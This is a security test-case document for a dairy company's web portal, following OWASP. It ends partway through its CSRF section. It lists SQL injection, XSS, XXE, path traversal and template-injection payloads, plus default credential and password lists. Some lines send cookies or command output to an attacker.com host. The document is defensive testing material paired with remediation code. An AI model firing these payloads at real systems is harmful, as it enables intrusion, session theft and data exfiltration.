# Security Test Cases for Smart Dairy Ltd.

## Document Control

| Field | Value |
|-------|-------|
| **Document ID** | G-017 |
| **Version** | 1.0 |
| **Date** | January 31, 2026 |
| **Author** | Security QA Engineer |
| **Owner** | QA Lead |
| **Reviewer** | Security Lead |
| **Classification** | Internal - Confidential |
| **Status** | Draft |

## Revision History

| Version | Date | Author | Description |
|---------|------|--------|-------------|
| 1.0 | January 31, 2026 | Security QA Engineer | Initial document creation |

## Table of Contents

1. [Introduction](#introduction)
2. [Test Environment Setup](#test-environment-setup)
3. [Authentication & Authorization Test Cases](#authentication--authorization-test-cases)
4. [Input Validation & Injection Test Cases](#input-validation--injection-test-cases)
5. [Session Management Test Cases](#session-management-test-cases)
6. [Business Logic Test Cases](#business-logic-test-cases)
7. [API Security Test Cases](#api-security-test-cases)
8. [Mobile Security Test Cases](#mobile-security-test-cases)
9. [Data Protection Test Cases](#data-protection-test-cases)
10. [Test Execution Summary](#test-execution-summary)
11. [Appendices](#appendices)

---

## Introduction

### Purpose

This document provides comprehensive security test cases for the Smart Dairy Web Portal System. It outlines systematic approaches to identify security vulnerabilities across all components of the application, including web interface, APIs, mobile applications, and backend systems.

### Scope

This document covers security testing for:
- Web Application (Customer Portal, Admin Dashboard)
- RESTful APIs
- Mobile Applications (iOS and Android)
- Backend Services and Databases
- Third-party Integrations

### Testing Methodology

Security testing follows the OWASP Testing Guide v4.2 and OWASP Top 10 2021 framework. Tests are designed to:
- Identify vulnerabilities before production deployment
- Validate security controls are functioning as designed
- Ensure compliance with security standards (ISO 27001, PCI DSS)
- Protect sensitive dairy business and customer data

### Risk Level Definitions

| Risk Level | Definition | Response Time |
|------------|------------|---------------|
| **Critical** | Immediate system compromise, data breach, or complete service disruption | 24 hours |
| **High** | Significant security impact, potential data exposure, or privilege escalation | 72 hours |
| **Medium** | Limited security impact, requires specific conditions to exploit | 2 weeks |
| **Low** | Minor security issue, informational findings | Next release |

---

## Test Environment Setup

### Required Tools

| Category | Tools |
|----------|-------|
| **Proxy/Intercepting** | Burp Suite Professional, OWASP ZAP, Fiddler |
| **Vulnerability Scanning** | Nessus, OpenVAS, Acunetix |
| **Static Analysis** | SonarQube, Checkmarx, Semgrep |
| **Mobile Testing** | MobSF, Frida, Objection, Android Studio |
| **Network Testing** | Nmap, Wireshark, Metasploit |
| **API Testing** | Postman, REST Assured, SoapUI |
| **Cryptography** | SSL Labs, testssl.sh, Cryptool |

### Test Environment Configuration

```
Environment: Staging/Pre-Production
URL: https://staging.smartdairy.com
API Endpoint: https://api-staging.smartdairy.com
Mobile App: Smart Dairy v2.0.0 (Beta)
Database: PostgreSQL 15 (Test Instance)
```

### Test Data Requirements

- Test user accounts with various privilege levels
- Sample product data (milk, cheese, yogurt)
- Test payment methods (sandbox)
- Mock customer PII data (synthetic)

---

## Authentication & Authorization Test Cases

### Category Summary
| Category | Test Cases | Critical | High | Medium | Low |
|----------|------------|----------|------|--------|-----|
| Authentication & Authorization | 10 | 4 | 4 | 2 | 0 |

---

### SEC-AUTH-001: Brute Force Attack Prevention

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-AUTH-001 |
| **OWASP Reference** | OWASP Top 10 2021 - A07: Identification and Authentication Failures |
| **Test Title** | Brute Force Attack Prevention on Login Endpoint |
| **Risk Level** | Critical |

**Prerequisites:**
- Access to login endpoint (/api/auth/login)
- Valid username for testing
- Burp Suite Intruder or similar tool
- Network access to application

**Attack Scenario/Steps:**

1. Configure Burp Suite to intercept login requests
2. Capture a valid login request to /api/auth/login
3. Send request to Intruder with the following configuration:
   - Position 1: Username field (fixed: valid username)
   - Position 2: Password field (payload: common passwords list)
4. Use password list containing: `password123`, `admin123`, `qwerty`, `123456`, etc.
5. Run attack with 100+ password attempts
6. Monitor response codes and timing
7. Attempt same attack with valid username list against single password

**Sample Attack Payload:**
```json
{
  "username": "farmer@smartdairy.com",
  "password": "[PAYLOAD]"
}
```

Password list (top 20 common):
```
123456, password, 12345678, qwerty, 123456789
letmein, 1234567, football, iloveyou, admin
welcome, monkey, login, abc123, 111111
123123, password123, admin123, qwerty123, 1234567890
```

**Expected Result:**
- Account should be locked after 5 failed attempts
- CAPTCHA should appear after 3 failed attempts
- Response time should increase progressively (exponential backoff)
- All requests should return generic error: "Invalid credentials"
- No indication of valid username vs valid password
- Account lockout notification sent to user email
- IP-based rate limiting should trigger after excessive attempts

**Tools:**
- Burp Suite Professional (Intruder)
- OWASP ZAP (Fuzzer)
- Hydra
- Custom Python script with requests library

**Remediation if Failed:**
```python
# Implement account lockout
MAX_FAILED_ATTEMPTS = 5
LOCKOUT_DURATION_MINUTES = 30

# Implement exponential backoff
if failed_attempts > 3:
    delay = 2 ** (failed_attempts - 3)
    time.sleep(delay)

# Implement CAPTCHA after 3 failures
if failed_attempts >= 3:
    require_captcha = True

# Generic error messages
error_message = "Invalid username or password"
```

---

### SEC-AUTH-002: Session Timeout Validation

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-AUTH-002 |
| **OWASP Reference** | OWASP Top 10 2021 - A07: Identification and Authentication Failures |
| **Test Title** | Session Timeout and Automatic Logout |
| **Risk Level** | High |

**Prerequisites:**
- Valid user account with active session
- Access to application with session monitoring
- Ability to track session cookies/tokens

**Attack Scenario/Steps:**

1. Login to application and capture session token
2. Record session cookie/token values and timestamps
3. Leave session idle for 15 minutes
4. Attempt to access protected resource
5. Repeat with 30 minutes idle time
6. Check if session extends with activity
7. Verify absolute timeout (maximum session duration)

**Expected Result:**
- Session should expire after 15 minutes of inactivity
- Absolute timeout should occur after 8 hours maximum
- User should be redirected to login page with message
- Server-side session should be invalidated
- Old session token should be rejected on subsequent requests
- Concurrent session limit should be enforced (max 3 per user)

**Tools:**
- Browser Developer Tools
- Burp Suite Proxy
- Postman for API validation

**Remediation if Failed:**
```javascript
// Server-side session configuration
const sessionConfig = {
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: true,
    httpOnly: true,
    sameSite: 'strict',
    maxAge: 15 * 60 * 1000,  // 15 minutes
    expires: new Date(Date.now() + 8 * 60 * 60 * 1000)  // 8 hours absolute
  },
  rolling: true  // Reset timeout on activity
};
```

---

### SEC-AUTH-003: Password Policy Enforcement

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-AUTH-003 |
| **OWASP Reference** | OWASP ASVS 4.0 - V2.1 Password Security |
| **Test Title** | Password Strength and Policy Validation |
| **Risk Level** | High |

**Prerequisites:**
- Access to registration endpoint
- Access to password change endpoint
- List of weak and strong passwords for testing

**Attack Scenario/Steps:**

1. Attempt registration with weak passwords:
   - Less than 12 characters
   - Only lowercase letters
   - Common dictionary words
   - Username in password
   - Sequential characters (abc, 123)
   - Repeated characters (aaa, 111)
2. Test password change functionality with same weak passwords
3. Verify password history prevents reuse
4. Check for common password blacklist enforcement

**Sample Weak Passwords (Should be Rejected):**
```
12345678, password, Password1, qwerty123, abc123456
SmartDairy2024, farmer123, milk12345, 87654321, letmein
Password!, Admin123!, 111111111111, aaaaaaaa, qwertyuiop
```

**Sample Strong Passwords (Should be Accepted):**
```
Tr0ub4dor&3M1lk, C0mpl3xP@ssw0rd!2024, M1lk&Ch33s3#F4rm
D@1ryPr0duct$2024, S3cur3F@rm#M1lkw4y, Gr4ssF3dC0w$M1lk
```

**Expected Result:**
- Minimum length: 12 characters
- Must contain: uppercase, lowercase, number, special character
- Cannot contain username or email
- Cannot be in common password list (top 10,000)
- Password history: prevent last 12 passwords
- Show password strength meter to users
- No password hints or reminder questions

---

### SEC-AUTH-004: Multi-Factor Authentication Bypass

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-AUTH-004 |
| **OWASP Reference** | OWASP Top 10 2021 - A07: Identification and Authentication Failures |
| **Test Title** | MFA Bypass Attempts and Validation |
| **Risk Level** | Critical |

**Prerequisites:**
- Account with MFA enabled
- Access to MFA endpoints
- Ability to intercept and modify requests

**Attack Scenario/Steps:**

1. **Response Manipulation:**
   - Login with valid credentials
   - At MFA prompt, enter random code
   - Intercept response and change `mfa_verified: false` to `true`
   
2. **Parameter Tampering:**
   - Skip MFA step by directly accessing dashboard URL
   - Remove MFA parameter from request body
   - Set `mfa_required: false` in request
   
3. **Brute Force OTP:**
   - Attempt to brute force 6-digit TOTP code
   - Test rate limiting on OTP validation endpoint
   
4. **Backup Code Abuse:**
   - Attempt reuse of backup codes
   - Test backup code generation without authentication

**Expected Result:**
- Direct dashboard access without MFA should be blocked
- Response manipulation should not bypass MFA
- Rate limiting should prevent OTP brute force (< 5 attempts)
- Used backup codes should be immediately invalidated
- MFA should be enforced for all sensitive operations
- Session should not be established without valid MFA

---

### SEC-AUTH-005: Privilege Escalation - Horizontal

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-AUTH-005 |
| **OWASP Reference** | OWASP Top 10 2021 - A01: Broken Access Control |
| **Test Title** | Horizontal Privilege Escalation Testing |
| **Risk Level** | Critical |

**Prerequisites:**
- Two regular customer accounts (User A and User B)
- Access to user profile and order endpoints
- Ability to modify request parameters

**Attack Scenario/Steps:**

1. Login as User A (farmer1@example.com, user_id: 1001)
2. Access User A's profile: GET /api/users/1001/profile
3. Capture request and modify user_id to 1002 (User B)
4. Attempt to access User B's profile: GET /api/users/1002/profile
5. Test on endpoints:
   - /api/orders/{order_id} (try other users' orders)
   - /api/invoices/{invoice_id}
   - /api/deliveries/{delivery_id}
   - /api/payments/{payment_id}
6. Modify POST/PUT requests to include other user_id

**Sample Attack Payload:**
```http
GET /api/users/1002/profile HTTP/1.1
Host: api.smartdairy.com
Authorization: Bearer [USER_A_TOKEN]
Content-Type: application/json
```

**Expected Result:**
- Access to other users' data should be denied (403 Forbidden)
- Server should validate user_id against session token
- Response should be generic: "Access denied" without revealing existence
- All IDOR (Insecure Direct Object Reference) vulnerabilities should be blocked
- Access control checks should be enforced server-side

---

### SEC-AUTH-006: Privilege Escalation - Vertical

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-AUTH-006 |
| **OWASP Reference** | OWASP Top 10 2021 - A01: Broken Access Control |
| **Test Title** | Vertical Privilege Escalation Testing |
| **Risk Level** | Critical |

**Prerequisites:**
- Regular customer account
- Knowledge of admin endpoint URLs
- Ability to modify request parameters and headers

**Attack Scenario/Steps:**

1. Login as regular customer
2. Attempt to access admin endpoints:
   - GET /admin/dashboard
   - GET /admin/users
   - POST /admin/users/create
   - PUT /admin/users/{id}/role
   - DELETE /admin/products/{id}
3. Modify JWT token payload to change role claim
4. Attempt to assign admin role via user profile update
5. Test mass assignment on registration: `{"role": "admin", ...}`
6. Test cookie tampering for role elevation

**Expected Result:**
- All admin endpoints should return 403 Forbidden
- JWT signature validation should reject tampered tokens
- Mass assignment should be prevented (whitelist approach)
- Role modification should not be possible from client-side
- Server-side role validation on every request

---

### SEC-AUTH-007: Concurrent Session Handling

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-AUTH-007 |
| **OWASP Reference** | OWASP ASVS 4.0 - V3.3 Session Termination |
| **Test Title** | Concurrent Session Detection and Management |
| **Risk Level** | High |

**Prerequisites:**
- Single user account
- Multiple browsers/devices
- Ability to monitor active sessions

**Attack Scenario/Steps:**

1. Login from Browser A (Chrome) - Session 1
2. Login from Browser B (Firefox) - Session 2
3. Login from Mobile App - Session 3
4. Attempt 4th concurrent login
5. Check if previous sessions are terminated
6. Test session invalidation on password change
7. Test "Logout from all devices" functionality

**Expected Result:**
- Maximum 3 concurrent sessions per user
- 4th login should either block or terminate oldest session
- Password change should invalidate all other sessions
- User should see list of active sessions
- "Logout all" should terminate all sessions except current
- Session metadata should include: device, IP, location, timestamp

---

### SEC-AUTH-008: Default Credentials Check

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-AUTH-008 |
| **OWASP Reference** | OWASP Top 10 2021 - A07: Identification and Authentication Failures |
| **Test Title** | Default and Weak Credentials Verification |
| **Risk Level** | Critical |

**Prerequisites:**
- Network access to application
- List of default credentials for common systems

**Attack Scenario/Steps:**

1. Test default admin credentials:
   - admin/admin, admin/password, admin/123456
   - administrator/admin, root/root
   - smartdairy/admin, dairy/admin123
2. Test database default credentials if exposed
3. Check for test accounts in production
4. Verify default API keys are changed
5. Check for hardcoded credentials in source code

**Default Credentials List:**
```
admin:admin, admin:password, admin:123456, admin:admin123
root:root, root:password, administrator:admin
test:test, demo:demo, user:user
guest:guest, support:support, info:info
smartdairy:smartdairy, dairy:dairy123, farm:farm2024
```

**Expected Result:**
- All default credentials should be rejected
- No test/demo accounts in production
- Force password change on first login for new accounts
- No hardcoded credentials in source code
- Regular credential auditing

---

### SEC-AUTH-009: Account Enumeration

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-AUTH-009 |
| **OWASP Reference** | OWASP ASVS 4.0 - V2.2 General Authenticator Security |
| **Test Title** | User Enumeration Prevention |
| **Risk Level** | Medium |

**Prerequisites:**
- Access to login, registration, and password reset endpoints
- Valid and invalid usernames/email addresses

**Attack Scenario/Steps:**

1. Test login error messages:
   - Valid username + wrong password
   - Invalid username + any password
   - Compare response messages, timing, and codes
   
2. Test registration:
   - Try to register existing username/email
   - Analyze error response
   
3. Test password reset:
   - Submit valid email
   - Submit invalid email
   - Compare responses

**Expected Result:**
- Identical error message for all login failures: "Invalid credentials"
- Identical response time for valid and invalid usernames
- Registration error: "Unable to create account" (not "Username exists")
- Password reset: "If email exists, reset link sent" (same message for all)
- No username/email disclosure in any error message

---

### SEC-AUTH-010: OAuth/OpenID Connect Security

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-AUTH-010 |
| **OWASP Reference** | OWASP Cheat Sheet - OAuth 2.0 Threat Model |
| **Test Title** | OAuth 2.0 and OpenID Connect Security Validation |
| **Risk Level** | High |

**Prerequisites:**
- OAuth integration configured (Google, Facebook)
- Ability to intercept OAuth flow

**Attack Scenario/Steps:**

1. **State Parameter Validation:**
   - Remove state parameter from callback
   - Modify state parameter value
   - Replay old state parameter
   
2. **Redirect URI Validation:**
   - Modify redirect_uri to attacker domain
   - Use redirect_uri with different domain
   - Path traversal in redirect_uri
   
3. **Token Exchange:**
   - Replay authorization code
   - Use code with different client_id
   
4. **PKCE Validation:**
   - Skip PKCE for public clients
   - Invalid code_verifier

**Expected Result:**
- State parameter must be validated and match
- Redirect URI must match pre-registered exact value
- Authorization codes single-use only
- PKCE required for all public clients
- ID token signature validation enforced
- Proper nonce validation for implicit flow

---


## Input Validation & Injection Test Cases

### Category Summary
| Category | Test Cases | Critical | High | Medium | Low |
|----------|------------|----------|------|--------|-----|
| Input Validation & Injection | 10 | 6 | 3 | 1 | 0 |

---

### SEC-INJ-001: SQL Injection - Authentication Bypass

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-INJ-001 |
| **OWASP Reference** | OWASP Top 10 2021 - A03: Injection |
| **Test Title** | SQL Injection in Login Authentication |
| **Risk Level** | Critical |

**Prerequisites:**
- Access to login endpoint
- SQL injection payload database
- Burp Suite or similar proxy

**Attack Scenario/Steps:**

1. Test classic SQL injection in username field
2. Test in password field
3. Test with various quote styles (', ", `)
4. Test comment variations (-- -, #, /* */)
5. Test boolean-based blind SQLi
6. Test time-based blind SQLi

**SQL Injection Payloads:**

Authentication Bypass:
```sql
' OR '1'='1' --
' OR '1'='1' /*
' OR 1=1 --
' OR 1=1#
' OR '1'='1' LIMIT 1 --
admin' --
admin' /*
admin' OR '1'='1
' OR '1'='1' OR '1'='1
') OR ('1'='1
')) OR (('1'='1
' OR 1=1 LIMIT 1 --
```

Union-based:
```sql
' UNION SELECT null,null,null --
' UNION SELECT username,password,email FROM users --
```

Time-based Blind:
```sql
' OR SLEEP(5) --
' OR pg_sleep(5) --
' OR (SELECT * FROM (SELECT(SLEEP(5)))a) --
```

Error-based:
```sql
' AND 1=CONVERT(int, (SELECT @@version)) --
' AND extractvalue(1, concat(0x7e, (SELECT @@version), 0x7e)) --
```

**Expected Result:**
- All SQL injection attempts should be blocked
- Application should use parameterized queries/prepared statements
- Input sanitization should escape special characters
- WAF should detect and block malicious patterns
- Error messages should not reveal database structure
- Login should fail with generic message

**Tools:**
- SQLMap
- Burp Suite (SQLi extension)
- Havij
- Manual testing with payload list

**Remediation if Failed:**
```python
# SECURE CODE - Parameterized Query:
def authenticate_user(username, password):
    query = "SELECT * FROM users WHERE username = %s"
    cursor.execute(query, (username,))
    user = cursor.fetchone()
    
    if user and verify_password(user['password_hash'], password):
        return user
    return None
```

---

### SEC-INJ-002: SQL Injection - Search and Filters

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-INJ-002 |
| **OWASP Reference** | OWASP Top 10 2021 - A03: Injection |
| **Test Title** | SQL Injection in Search and Filter Functions |
| **Risk Level** | Critical |

**Prerequisites:**
- Access to search functionality
- Product/catalog search endpoints
- Order history search

**Attack Scenario/Steps:**

1. Test product search: `milk' OR '1'='1`
2. Test order filter with SQLi payloads
3. Test sorting parameters for injection
4. Test pagination parameters
5. Test advanced filter combinations

**Attack Payloads:**

Search Injection:
```sql
milk' UNION SELECT username,password,email FROM admin_users --
cheese' AND 1=0 UNION SELECT table_name,column_name,data_type FROM information_schema.columns --
yogurt' OR 1=1 --
butter' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --
milk' ORDER BY 10 --
```

Filter Manipulation:
```
price_from=0&price_to=100' OR '1'='1
category=all' UNION SELECT * FROM users --
sort_by=price' AND 1=0 UNION SELECT @@version --
```

**Expected Result:**
- Search queries should be parameterized
- User input should never be directly concatenated into SQL
- ORM query builder should escape all inputs
- Error messages should not expose SQL details
- Input validation should reject suspicious patterns

---

### SEC-INJ-003: Cross-Site Scripting (XSS) - Stored

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-INJ-003 |
| **OWASP Reference** | OWASP Top 10 2021 - A03: Injection (XSS) |
| **Test Title** | Stored XSS in User Input Fields |
| **Risk Level** | Critical |

**Prerequisites:**
- Valid user account
- Access to input fields that persist data
- Review/comment functionality

**Attack Scenario/Steps:**

1. Test profile fields: name, bio, address
2. Test product reviews and ratings
3. Test order comments
4. Test support tickets/messages
5. Verify payload executes when other users view the data

**Stored XSS Payloads:**

Basic Script Injection:
```html
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
```

Event Handler Injection:
```html
<img src=x onerror=alert('XSS')>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
```

SVG-based XSS:
```html
<svg onload=alert('XSS')>
<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>
```

JavaScript Protocol:
```html
<a href="javascript:alert('XSS')">Click me</a>
```

Template Injection:
```html
{{constructor.constructor('alert("XSS")')()}}
${alert('XSS')}
```

**Expected Result:**
- All user input should be HTML-encoded before display
- Content Security Policy (CSP) should prevent inline scripts
- Input validation should reject dangerous tags
- Output encoding context-aware (HTML, JS, URL, CSS)
- XSS payload should be displayed as text, not executed

**Remediation if Failed:**
```python
from markupsafe import escape
import bleach

# Output Encoding
def display_user_content(user_input):
    return escape(user_input)

# Input Sanitization
def sanitize_html(user_input):
    allowed_tags = ['p', 'br', 'strong', 'em', 'u']
    allowed_attrs = {}
    return bleach.clean(user_input, tags=allowed_tags, attributes=allowed_attrs)
```

**CSP Headers:**
```http
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self' https://api.smartdairy.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self';
```

---

### SEC-INJ-004: Cross-Site Scripting (XSS) - Reflected

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-INJ-004 |
| **OWASP Reference** | OWASP Top 10 2021 - A03: Injection (XSS) |
| **Test Title** | Reflected XSS in URL Parameters |
| **Risk Level** | High |

**Prerequisites:**
- Access to pages with URL parameters
- Search functionality
- Error pages

**Attack Scenario/Steps:**

1. Test search parameter reflection:
   `/search?q=<script>alert('XSS')</script>`
2. Test error message reflection
3. Test redirect parameter manipulation
4. Test tracking/analytics parameters

**Reflected XSS Payloads:**

Basic:
```
https://smartdairy.com/search?q=<script>alert('XSS')</script>
https://smartdairy.com/error?message=<img src=x onerror=alert('XSS')>
```

URL Encoded:
```
?q=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E
?q=<scr<script>ipt>alert('XSS')</scr</script>ipt>
```

DOM-based Vector:
```
#<img src=x onerror=alert('XSS')>
?search=<svg onload=alert('XSS')>
```

**Expected Result:**
- URL parameters should be HTML-encoded in response
- No reflection of user input without encoding
- CSP should block execution even if bypass occurs
- Framework auto-escaping should be enabled

---

### SEC-INJ-005: Cross-Site Scripting (XSS) - DOM-based

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-INJ-005 |
| **OWASP Reference** | OWASP Top 10 2021 - A03: Injection (XSS) |
| **Test Title** | DOM-based XSS in Client-side JavaScript |
| **Risk Level** | High |

**Prerequisites:**
- Access to JavaScript source code
- Understanding of DOM manipulation
- Pages using hash/fragment identifiers

**Attack Scenario/Steps:**

1. Identify dangerous sinks in JavaScript:
   - innerHTML, outerHTML
   - document.write
   - eval(), setTimeout(), setInterval()
   - location.href manipulation
2. Test sources:
   - URL hash (#)
   - query parameters
   - window.name
   - postMessage
3. Trace data flow from source to sink

**DOM XSS Payloads:**

Hash-based:
```
https://smartdairy.com/product#<img src=x onerror=alert('XSS')>
```

postMessage:
```javascript
// Malicious sender
window.postMessage("<img src=x onerror=alert('XSS')>", "*");
```

**Expected Result:**
- No user-controlled input in dangerous sinks
- Use textContent instead of innerHTML
- DOMPurify for sanitizing HTML
- postMessage origin validation

**Remediation if Failed:**
```javascript
// SECURE:
element.textContent = location.hash;

// Or with sanitization:
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(location.hash);

// postMessage security
window.addEventListener('message', (event) => {
    if (event.origin !== 'https://trusted-domain.com') {
        return;
    }
    // Process message
});
```

---

### SEC-INJ-006: Command Injection

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-INJ-006 |
| **OWASP Reference** | OWASP Top 10 2021 - A03: Injection |
| **Test Title** | OS Command Injection in File Operations |
| **Risk Level** | Critical |

**Prerequisites:**
- File upload/download functionality
- PDF generation or report features
- System integration features

**Attack Scenario/Steps:**

1. Test file name parameter in uploads:
   - Filename: `report.pdf; cat /etc/passwd`
2. Test report generation with command injection
3. Test image processing commands
4. Test email/notification features

**Command Injection Payloads:**

Basic Command Chaining:
```
file.txt; cat /etc/passwd
file.txt && whoami
file.txt | id
file.txt `cat /etc/passwd`
file.txt $(cat /etc/passwd)
```

Blind Command Injection:
```
file.txt; sleep 5
file.txt && ping -c 5 attacker.com
file.txt; curl https://attacker.com/$(whoami)
```

File System Traversal:
```
../../etc/passwd
..\..\windows\system32\drivers\etc\hosts
```

**Expected Result:**
- No user input in shell commands
- Use parameterized APIs instead of shell execution
- Input validation and sanitization
- Least privilege for application user

**Remediation if Failed:**
```python
# SECURE - Use library APIs:
from PIL import Image

def process_image(filename):
    safe_filename = secure_filename(filename)
    img = Image.open(safe_filename)
    img.thumbnail((800, 600))
    img.save('output.jpg')

# If shell is necessary:
import subprocess

def safe_shell_command(user_input):
    if not re.match(r'^[a-zA-Z0-9_\-]+$', user_input):
        raise ValueError("Invalid input")
    subprocess.run(['/usr/bin/command', user_input], shell=False)
```

---

### SEC-INJ-007: LDAP Injection

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-INJ-007 |
| **OWASP Reference** | OWASP Testing Guide - LDAP Injection |
| **Test Title** | LDAP Injection in Directory Services |
| **Risk Level** | High |

**Prerequisites:**
- LDAP authentication or directory integration
- User search functionality

**Attack Scenario/Steps:**

1. Test LDAP search filters
2. Test authentication bypass
3. Test attribute disclosure

**LDAP Injection Payloads:**

Authentication Bypass:
```
*)(uid=*))(&(uid=*
*))(&(objectClass=*
admin)(|(password=*
*)(cn=*))(&(cn=*
```

**Expected Result:**
- LDAP filters should be escaped
- No user input directly in filter strings
- Use parameterized LDAP queries

---

### SEC-INJ-008: XML External Entity (XXE) Injection

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-INJ-008 |
| **OWASP Reference** | OWASP Top 10 2021 - A05: Security Misconfiguration (XXE) |
| **Test Title** | XML External Entity Injection |
| **Risk Level** | Critical |

**Prerequisites:**
- XML upload functionality
- SOAP API endpoints
- Document parsing (DOCX, XLSX, PDF)

**Attack Scenario/Steps:**

1. Upload XML file with external entities
2. Test SOAP requests for XXE
3. Test file uploads (DOCX, XLSX contain XML)
4. Test SVG uploads

**XXE Payloads:**

File Disclosure:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<order>
  <customer>&xxe;</customer>
</order>
```

SSRF via XXE:
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-api.smartdairy.com/secrets">
]>
```

Billion Laughs (DoS):
```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>
```

**Expected Result:**
- External entity processing disabled
- DTD processing disabled
- XML parser securely configured
- No SSRF via XML entities

**Remediation if Failed:**
```python
from defusedxml import ElementTree as ET

def parse_xml_safely(xml_data):
    # Use defusedxml which prevents XXE by default
    root = ET.fromstring(xml_data)
    return root
```

---

### SEC-INJ-009: Path Traversal

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-INJ-009 |
| **OWASP Reference** | OWASP Path Traversal Cheat Sheet |
| **Test Title** | Path Traversal in File Access |
| **Risk Level** | High |

**Prerequisites:**
- File download/view functionality
- File upload with path specification

**Attack Scenario/Steps:**

1. Test file download endpoint
2. Test with various encoding

**Path Traversal Payloads:**
```
../../../etc/passwd
..\..\..\windows\win.ini
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
../../../etc/passwd%00.jpg
```

**Expected Result:**
- Path validation and normalization
- Filename whitelist validation
- Chroot/jail for file operations
- No access outside allowed directories

**Remediation if Failed:**
```python
import os
from pathlib import Path

def safe_file_access(filename, base_directory):
    base_path = Path(base_directory).resolve()
    requested_path = (base_path / filename).resolve()
    
    if not str(requested_path).startswith(str(base_path)):
        raise ValueError("Path traversal detected")
    
    allowed_extensions = ['.pdf', '.jpg', '.png', '.docx']
    if not any(requested_path.suffix == ext for ext in allowed_extensions):
        raise ValueError("Invalid file type")
    
    return requested_path
```

---

### SEC-INJ-010: Template Injection (SSTI)

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-INJ-010 |
| **OWASP Reference** | OWASP Testing Guide - SSTI |
| **Test Title** | Server-Side Template Injection |
| **Risk Level** | Critical |

**Prerequisites:**
- Template-based rendering (Jinja2, Twig, etc.)
- User input in templates

**Attack Scenario/Steps:**

1. Test for template syntax recognition
2. Test for command execution

**SSTI Payloads:**

Detection:
```
${7*7}
{{7*7}}
<%= 7*7 %>
${"z".join(":")}
```

Python/Jinja2 RCE:
```
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
```

**Expected Result:**
- User input should not be in templates
- Use context-aware auto-escaping
- Sandboxed template environments
- No execution of arbitrary code

**Remediation if Failed:**
```python
from jinja2 import Environment, select_autoescape

# Use autoescaping
env = Environment(autoescape=select_autoescape(['html', 'xml']))

# Don't pass user input directly to template
def render_template_safe(template_name, user_data):
    safe_data = sanitize_for_template(user_data)
    template = env.get_template(template_name)
    return template.render(data=safe_data)
```


## Session Management Test Cases

### Category Summary
| Category | Test Cases | Critical | High | Medium | Low |
|----------|------------|----------|------|--------|-----|
| Session Management | 8 | 3 | 3 | 2 | 0 |

---

### SEC-SES-001: Session Fixation

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-SES-001 |
| **OWASP Reference** | OWASP Testing Guide - Session Fixation |
| **Test Title** | Session Fixation Attack |
| **Risk Level** | High |

**Prerequisites:**
- Access to login functionality
- Ability to manipulate session identifiers

**Attack Scenario/Steps:**

1. Attacker visits site and obtains session ID
2. Attacker sends link with fixed session ID to victim
3. Victim logs in with fixed session ID
4. Attacker uses same session ID to access victim's account

**Expected Result:**
- Session ID should be regenerated after login
- Old session ID should be invalidated
- Session fixation attempts should be blocked

**Remediation if Failed:**
```python
def login_user(username, password):
    if authenticate(username, password):
        # Regenerate session ID
        old_session = session.get('id')
        session.regenerate()
        session['user_id'] = user.id
        session['authenticated'] = True
        
        # Invalidate old session server-side
        invalidate_session(old_session)
        
        return redirect('/dashboard')
```

---

### SEC-SES-002: Session Hijacking

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-SES-002 |
| **OWASP Reference** | OWASP Testing Guide - Session Hijacking |
| **Test Title** | Session Token Prediction and Theft |
| **Risk Level** | Critical |

**Prerequisites:**
- Valid session tokens
- Multiple session tokens for analysis

**Attack Scenario/Steps:**

1. Analyze session token randomness
2. Test for predictable patterns
3. Attempt session token brute force
4. Test for token exposure in logs/URLs

**Expected Result:**
- Cryptographically secure random tokens (128+ bits)
- No predictable patterns in token generation
- Tokens not exposed in URLs
- HTTPS-only transmission

**Tools:**
- Burp Suite Sequencer
- Entropy analysis tools

**Remediation if Failed:**
```python
import secrets
import hashlib

def generate_session_token():
    # Cryptographically secure random token
    token = secrets.token_urlsafe(32)  # 256 bits
    
    # Additional hash for storage
    token_hash = hashlib.sha256(token.encode()).hexdigest()
    
    return token, token_hash
```

---

### SEC-SES-003: Cross-Site Request Forgery (CSRF)

| Field | Details |
|-------|---------|
| **Test Case ID** | SEC-SES-003 |
